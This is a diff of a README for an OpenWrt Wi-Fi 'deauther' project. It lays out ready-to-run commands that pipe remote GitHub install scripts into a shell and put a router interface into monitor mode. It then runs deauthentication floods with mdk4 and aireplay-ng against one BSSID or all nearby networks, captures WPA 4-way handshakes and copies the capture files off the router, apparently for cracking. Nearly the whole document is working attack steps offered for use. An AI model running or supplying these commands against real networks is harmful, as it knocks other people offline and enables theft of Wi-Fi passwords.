@@ -20,53 +20,66 @@ telnet 192.168.1.1
 ```sh
 opkg update && wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install | sh
 ````
-
-# Using mdk4
-> install mdk4
-```sh
-opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
-```
-
-# Using aireplay-ng 
-> run monitor mode
-```sh
-sh wlan0mon && airodump-ng wlan0mon
-```
-> ctrl + c
-```sh
-aireplay-ng wlan0mon --deauth 0 -a (Mac BSSID)
-```
-# Monitor Mode
+# Install Monitor Mode
 ```sh
 wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/wlan0mon | sh
 ```
-# Run
+# Run monitor mode
+> script
+```
+iw phy phy0 interface add wlan0mon type monitor
+ip link set wlan0mon up
+```
+> short
 ```sh
 sh wlan0mon
 ```
-# Using mdk4
-```sh
-sh wlan0mon && mdk4 wlan0mon d
+# Enable full monitor mode using airmon-ng (optional)
 ```
-## Manual
-> More info
- - aireplay-ng --help
- - airodump-ng --help
- - aircrack-ng --help
-
-`iw phy phy0 interface add wlan0mon type monitor`
-
-`ip link set wlan0mon up`
-
-`airodump-ng wlan0mon`
-
-`aireplay-ng wlan0mon --deauth 0 -a 32:AA:E4:18:90:45 --ignore-negative-one`
-
-- -a | bssid -a (32:AA:E4:18:90:45)
-
+airmon-ng start wlan0
+```
+# Install mdk4
+> (mipsel_24kc)
+```sh
+opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
+```
+# Scan wifi from the terminal
+```
+iw wlan0 scan | grep BSS
+```
+# Scan wifi using airodump-ng
+```
+sh wlan0mon && airodump-ng wlan0mon
+```
+## Deauth attack using mdk4
+> 1.Enable monitor mode
+```
+sh wlan0mon && airodump-ng wlan0mon
+```
+> 2.Deauth a specific target BSSID
+```
+mdk4 wlan0mon d -B (BSSID) -m
+```
+> 3.Deauth all
+```
+mdk4 wlan0mon d
+```
+# Deauth attack using aireplay-ng
+> 1.Enable the monitor mode
+```
+sh wlan0mon && airodump-ng wlan0mon
+```
+> 2.Deauth a specific BSSID
+```
+aireplay-ng wlan0mon --deauth 0 -a (BSSID) --ignore-negative-one
+```
+-------
+# Capture the 4way handshakes
+```
+```
 ## Export handshake file from openwrt to local storage
 > [!Tip]
-> install SFTP server in both system in order that SCP to work
+> install SFTP server on both system in order that SCP to work
 
 > Openwrt: `opkg install openssh-sftp-server`
 
@@ -78,8 +91,11 @@ scp root@192.168.1.1:*.cap storage/downloads
 ```
 - Kali terminal 
 ```sh
-scp root@192.168.1.1:*.cap /home/*/Downloads
+scp root@192.168.1.1:*.cap /home/*/Download
 ```
 
-> [!Tip]
- > * .cap - export any name with .cap file format
+# More info
+ - aireplay-ng --help
+ - airodump-ng --help
+ - aircrack-ng --help
+ - mdk4 --help
